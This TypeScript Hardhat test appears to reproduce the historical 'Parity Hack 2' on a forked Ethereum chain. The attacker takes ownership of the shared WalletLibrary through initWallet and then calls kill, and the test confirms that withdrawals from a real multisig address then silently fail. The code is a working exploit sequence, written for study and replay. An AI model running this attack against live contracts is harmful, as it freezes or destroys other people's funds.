import { expect } from "chai";
import { Contract, ContractTransaction, Signer } from "ethers";
import hre, { ethers } from "hardhat";
import { forkFrom } from "./utils/fork";

let accounts: Signer[];
let attacker: Signer;
let victim: Signer;
let wallet: Contract;
let walletLib: Contract;
let tx: ContractTransaction;

beforeEach(async () => {
  await forkFrom(4501735);

  accounts = await ethers.getSigners();
  [attacker] = accounts;

  // impersonate an owner of the wallet so we can call functions on it
  const WALLET_OWNER_ADDR = `0x003aAF73BF6A398cd40F72a122203C37A4128207`;
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [WALLET_OWNER_ADDR],
  });
  victim = ethers.provider.getSigner(WALLET_OWNER_ADDR);

  wallet = await ethers.getContractAt(
    `Wallet`,
    `0x1C0e9B714Da970E6466Ba8E6980C55E7636835a6`
  );
  walletLib = await ethers.getContractAt(
    `WalletLibrary`,
    `0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4`
  );
});

const withdraw = async () => {
  // make sure it's less than m_dailyLimit so we only need single owner
  const withdrawalAmount = ethers.utils.parseEther(`0.000001`);
  const data = walletLib.interface.encodeFunctionData(`execute`, [
    await victim.getAddress(),
    withdrawalAmount,
    [],
  ]);
  // will invoke fallback function
  tx = await victim.sendTransaction({
    to: wallet.address,
    data,
  });
  return tx;
};

describe("Parity Hack 2", function () {
  it("allows withdrawals before being killed", async function () {
    const balanceBefore = await victim.provider!.getBalance(wallet.address);

    tx = await withdraw();

    const balanceAfter = await victim.provider!.getBalance(wallet.address);
    expect(balanceAfter.lt(balanceBefore), "withdrawal did not work").to.be.true;
  });

  it("breaks withdrawals after being killed", async function () {
    const balanceBefore = await victim.provider!.getBalance(wallet.address);

    // first call initWallet to make us the owner
    tx = await walletLib.initWallet(
      [await attacker.getAddress()],
      1,
      ethers.utils.parseEther(`1`)
    );
    // then kill it
    tx = await walletLib.kill(
      await attacker.getAddress()
    );

    // withdrawal does not revert, is simply a noop now
    tx = await withdraw();

    const balanceAfter = await victim.provider!.getBalance(wallet.address);
    expect(balanceAfter.eq(balanceBefore), "withdrawal did not work").to.be.true;
  });
});
